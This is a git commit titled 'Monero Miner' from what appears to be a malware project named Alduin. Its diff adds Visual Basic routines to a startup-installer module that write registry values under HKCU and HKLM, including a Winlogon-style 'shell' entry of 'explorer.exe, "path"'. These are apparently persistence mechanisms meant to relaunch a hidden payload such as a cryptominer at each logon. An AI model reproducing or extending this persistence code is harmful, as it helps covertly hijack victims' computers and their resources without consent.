14f7ba276dbaafea30daf773b40971ddb6b0dd40
mogyiii <kankkaka@gmail.com>
2020-06-03 14:17:01 +0200

    Monero Miner

--- Alduin/Alduin.Stump/Moduls/Installers/StartupRegistryModule.vb
+++ Alduin/Alduin.Stump/Moduls/Installers/StartupRegistryModule.vb
@@ -6,5 +6,16 @@ Module StartupRegistryModule
         regKey.SetValue("shell", "explorer.exe, " & """" & path & """")
         regKey.Close()
     End Sub
-
+    Public Sub Set_CurrentUser_registry(ByVal reglocal As String, ByVal execute As String, ByVal shell As String)
+        Dim regKey As RegistryKey
+        regKey = Registry.CurrentUser.OpenSubKey(reglocal, True)
+        regKey.SetValue(shell, "explorer.exe, " & """" & execute & """")
+        regKey.Close()
+    End Sub
+    Public Sub Set_LocalMachine_registry(ByVal reglocal As String, ByVal applicationName As String, ByVal applicationPath As String)
+        Dim regKey As RegistryKey
+        regKey = Registry.LocalMachine.OpenSubKey(reglocal, True)
+        regKey.SetValue(applicationName, """" & applicationPath & """")
+        regKey.Close()
+    End Sub
 End Module
